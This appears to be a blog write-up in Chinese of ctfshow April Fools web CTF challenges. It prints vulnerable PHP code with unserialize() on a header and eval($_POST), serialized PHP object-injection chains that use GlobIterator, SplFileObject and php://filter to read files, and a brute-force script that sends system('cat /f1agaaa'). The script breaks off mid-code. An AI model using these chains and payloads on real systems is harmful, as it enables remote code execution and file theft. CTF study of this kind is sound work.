<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>ctfshow愚人杯web复现 - 编程大白的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="ctfshow愚人杯web复现" />
<meta property="og:description" content="easy_signin 题目url
base64解码是face.png，尝试flag.txt和flag.php，base64加密后传入都不对，用index.php加密后传入，看源码
将后面的base64解密得到flag
被遗忘的反序列化 源码
&lt;?php # 当前目录中有一个txt文件哦 error_reporting(0); show_source(__FILE__); include(&#34;check.php&#34;); class EeE{ public $text; public $eeee; public function __wakeup(){ if ($this-&gt;text == &#34;aaaa&#34;){ echo lcfirst($this-&gt;text); } } public function __get($kk){ echo &#34;$kk,eeeeeeeeeeeee&#34;; } public function __clone(){ $a = new cycycycy; $a -&gt; aaa(); } } class cycycycy{ public $a; private $b; public function aaa(){ $get = $_GET[&#39;get&#39;]; $get = cipher($get); if($get === &#34;p8vfuv8g8v8py&#34;){ eval($_POST[&#34;eval&#34;]); } } public function __invoke(){ $a_a = $this -&gt; a; echo &#34;" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://bcdabai.github.io/posts/f1fc0d0c6e596818fc3d6fa5196f8c00/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-04-05T14:30:59+08:00" />
<meta property="article:modified_time" content="2023-04-05T14:30:59+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大白的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大白的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">ctfshow愚人杯web复现</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-dark">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <h3><a id="easy_signin_0"></a>easy_signin</h3> 
<p>题目url</p> 
<p><img src="https://images2.imgbox.com/7a/87/GkAvXamV_o.png" alt="image-20230404183149808"></p> 
<p>base64解码是<code>face.png</code>，尝试<code>flag.txt</code>和<code>flag.php</code>，base64加密后传入都不对，用<code>index.php</code>加密后传入，看源码</p> 
<p><img src="https://images2.imgbox.com/27/36/q5DoIXdM_o.png" alt="image-20230404183412221"></p> 
<p>将后面的base64解密得到flag</p> 
<p><img src="https://images2.imgbox.com/c3/00/yaBDtpbE_o.png" alt="image-20230404183454406"></p> 
<h3><a id="_14"></a>被遗忘的反序列化</h3> 
<p>源码</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token comment"># 当前目录中有一个txt文件哦</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"check.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">EeE</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$text</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$eeee</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">text</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"aaaa"</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
            <span class="token keyword">echo</span> <span class="token function">lcfirst</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">text</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$kk</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$kk</span></span>,eeeeeeeeeeeee"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">cycycycy</span><span class="token punctuation">;</span>
        <span class="token variable">$a</span> <span class="token operator">-&gt;</span> <span class="token function">aaa</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">cycycycy</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$b</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">aaa</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token variable">$get</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'get'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$get</span> <span class="token operator">=</span> <span class="token function">cipher</span><span class="token punctuation">(</span><span class="token variable">$get</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$get</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"p8vfuv8g8v8py"</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
            <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"eval"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>


    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token variable">$a_a</span> <span class="token operator">=</span> <span class="token variable">$this</span> <span class="token operator">-&gt;</span> <span class="token property">a</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"\$a_a\$"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">gBoBg</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$coos</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$eeee</span><span class="token operator">=</span><span class="token string double-quoted-string">"-_-"</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">name</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
            <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">coos</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span> <span class="token operator">-&gt;</span> <span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">coos</span><span class="token operator">-&gt;</span><span class="token property">name</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
            <span class="token variable">$aa</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">coos</span><span class="token punctuation">;</span>
            <span class="token variable">$bb</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">file</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token variable">$aa</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>   

<span class="token keyword">class</span> <span class="token class-name-definition class-name">w_wuw_w</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$aaa</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$key</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/php|63|\*|\?/i"</span><span class="token punctuation">,</span><span class="token variable">$this</span> <span class="token operator">-&gt;</span> <span class="token property">key</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">key</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span> <span class="token operator">-&gt;</span> <span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"不行哦"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">aaa</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span> <span class="token operator">-&gt;</span> <span class="token property">aaa</span> <span class="token operator">=</span> <span class="token keyword">clone</span> <span class="token keyword">new</span> <span class="token class-name">EeE</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token variable">$_ip</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"HTTP_AAAAAA"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_ip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<p>先看怎么传参</p> 
<pre><code class="prism language-php"><span class="token variable">$_ip</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"HTTP_AAAAAA"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
</code></pre> 
<p>这一句话的意思是接收header头中 aaaaaa参数的值，就例如这样的</p> 
<p><img src="https://images2.imgbox.com/3c/59/C73zfoFC_o.png" alt="image-20230404223656400"></p> 
<p>然后提示说有一个txt，但不知道名字是什么，想办法读取文件名</p> 
<p>再来看这个类</p> 
<pre><code class="prism language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">gBoBg</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$coos</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$eeee</span><span class="token operator">=</span><span class="token string double-quoted-string">"-_-"</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">name</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
            <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">coos</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span> <span class="token operator">-&gt;</span> <span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">coos</span><span class="token operator">-&gt;</span><span class="token property">name</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
            <span class="token variable">$aa</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">coos</span><span class="token punctuation">;</span>
            <span class="token variable">$bb</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">file</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token variable">$aa</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>   
</code></pre> 
<p>有一个</p> 
<pre><code class="prism language-php"> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">coos</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<p><code>coos</code>和<code>file</code>都是可控的，所以可以利用php原生类来读取文件</p> 
<h4><a id="GlobIterator_152"></a><strong>GlobIterator</strong></h4> 
<p>GlobIterator 类也可以遍历一个文件目录，但与上面略不同的是其行为类似于 glob()，可以通过模式匹配来寻找文件路径。</p> 
<p>它的特点就是，只需要知道部分名称就可以进行遍历</p> 
<p>例如</p> 
<pre><code class="prism language-shell"><span class="token operator">&lt;</span>?php
<span class="token variable">$dir</span><span class="token operator">=</span>new GlobIterator<span class="token punctuation">(</span><span class="token string">"/*flag*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token builtin class-name">echo</span> <span class="token variable">$dir</span><span class="token punctuation">;</span>
</code></pre> 
<p>之后就想办法触发<code>__toString()</code>，可以通过<code>EeE</code>类中的</p> 
<pre><code class="prism language-shell">class EeE<span class="token punctuation">{<!-- --></span>
    public <span class="token variable">$text</span><span class="token punctuation">;</span>
    public <span class="token variable">$eeee</span><span class="token punctuation">;</span>
    public <span class="token keyword">function</span> <span class="token function-name function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span>-<span class="token operator">&gt;</span>text <span class="token operator">==</span> <span class="token string">"aaaa"</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
            <span class="token builtin class-name">echo</span> lcfirst<span class="token punctuation">(</span><span class="token variable">$this</span>-<span class="token operator">&gt;</span>text<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<p>来触发，因为要<code>echo lcfirst($this-&gt;text);</code>还要满足if语句让<code>text==a</code>即可</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">EeE</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$text</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'a'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$eeee</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">gBoBg</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'123'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'*txt'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$coos</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'GlobIterator'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$e</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">EeE</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$e</span> <span class="token operator">-&gt;</span><span class="token property">text</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">gBoBg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//O:3:"EeE":2:{s:4:"text";O:5:"gBoBg":3:{s:4:"name";s:3:"123";s:4:"file";s:4:"*txt";s:4:"coos";s:12:"GlobIterator";}s:4:"eeee";N;}</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/73/e0/1yQPMN5e_o.png" alt="image-20230404233020353"></p> 
<p>得到<code>h1nt.txt</code>，之后官方wp上说在根目录无法直接读，但实际上好像是在本目录可以用原生类<code>SplFileObject</code>读</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">EeE</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$text</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'a'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$eeee</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">gBoBg</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'123'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'h1nt.txt'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$coos</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'SplFileObject'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$e</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">EeE</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$e</span> <span class="token operator">-&gt;</span><span class="token property">text</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">gBoBg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//O:3:"EeE":2:{s:4:"text";O:5:"gBoBg":3:{s:4:"name";s:3:"123";s:4:"file";s:8:"h1nt.txt";s:4:"coos";s:13:"SplFileObject";}s:4:"eeee";N;}</span>
</code></pre> 
<p>但读出来和官方wp上的不一样，没有key</p> 
<p><img src="https://images2.imgbox.com/cb/fb/Yt8VedyS_o.png" alt="image-20230404233854972"></p> 
<p>又尝试用file伪协议来读</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">EeE</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$text</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'a'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$eeee</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">gBoBg</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'123'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'php://filter/convert.base64-encode/resource=h1nt.txt'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$coos</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'SplFileObject'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$e</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">EeE</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$e</span> <span class="token operator">-&gt;</span><span class="token property">text</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">gBoBg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//O:3:"EeE":2:{s:4:"text";O:5:"gBoBg":3:{s:4:"name";s:3:"123";s:4:"file";s:52:"php://filter/convert.base64-encode/resource=h1nt.txt";s:4:"coos";s:13:"SplFileObject";}s:4:"eeee";N;}</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/0e/d9/VFB3aF5q_o.png" alt="image-20230404234155231"></p> 
<p>就都读出来了</p> 
<p><img src="https://images2.imgbox.com/54/d5/db2RuHrD_o.png" alt="image-20230404234240120"></p> 
<pre><code class="prism language-shell"><span class="token comment">#用于check.php </span>
key：qwertyuiopasdfghjklzxcvbnm123456789 
move：2~4
</code></pre> 
<p>猜测(看wp)</p> 
<p>其中move是移动的意思，猜测这是一个移位的加密，其中猜测key是范围那么就有向左就有3种可能， 向右也有3种可能 但是提示2提示我们random-随机，那么加密可能是2~7随机，那么每次正好相等就是1/24的几率</p> 
<p>之后就想办法构造链子触发利用<code>eval</code>函数了</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">EeE</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$text</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'a'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$eeee</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">cycycycy</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">gBoBg</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'1'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$coos</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">w_wuw_w</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$aaa</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$key</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span>

<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">EeE</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span> <span class="token operator">-&gt;</span><span class="token property">text</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">gBoBg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span> <span class="token operator">-&gt;</span><span class="token property">text</span> <span class="token operator">-&gt;</span><span class="token property">coos</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">w_wuw_w</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span> <span class="token operator">-&gt;</span><span class="token property">text</span> <span class="token operator">-&gt;</span><span class="token property">coos</span> <span class="token operator">-&gt;</span><span class="token property">aaa</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">cycycycy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//O:3:"EeE":2:{s:4:"text";O:5:"gBoBg":3:{s:4:"name";N;s:4:"file";s:1:"1";s:4:"coos";O:7:"w_wuw_w":3:{s:3:"aaa";O:8:"cycycycy":1:{s:1:"a";N;}s:3:"key";N;s:4:"file";N;}}s:4:"eeee";N;}</span>
</code></pre> 
<p>之后用脚本爆破key就可以了，贴一个官方的脚本</p> 
<pre><code class="prism language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> re

mi <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'i6xstx6d6x6ir'</span><span class="token punctuation">,</span><span class="token string">'u5zarz5s5z5ue'</span><span class="token punctuation">,</span><span class="token string">'y4lpel4a4l4yw'</span><span class="token punctuation">,</span><span class="token string">'sqnhonqjqnqsi'</span><span class="token punctuation">,</span><span class="token string">'dwmjpmwkwmwdo'</span><span class="token punctuation">,</span><span class="token string">'fe1ka1ele1efp'</span><span class="token punctuation">]</span>
d <span class="token operator">=</span> <span class="token number">1</span>
<span class="token keyword">while</span> d<span class="token operator">&lt;</span><span class="token number">2</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> mi<span class="token punctuation">:</span>
        data <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
            <span class="token string">'eval'</span><span class="token punctuation">:</span><span class="token string">'system("cat /f1agaaa");'</span>
        <span class="token punctuation">}</span>
        url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"http://67423f19-3ba4-41b5-9e10-716ce8f5e683.challenge.ctf.show/index.php?get=</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>i<span class="token punctuation">}</span></span><span class="token string">"</span></span>
        header <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
            <span class="token string">'aaaaaa'</span><span class="token punctuation">:</span><span class="token string">'O:3:"EeE":2:{s:4:"text";O:5:"gBoBg":3:{s:4:"name";N;s:4:"file";s:1:"1";s:4:"coos";O:7:"w_wuw_w":3:{s:3:"aaa";O:8:"cycycycy":1:{s:1:"a";N;}s:3:"key";N;s:4:"file";N;}}s:4:"eeee";N;}'</span>
        <span class="token punctuation">}</span>
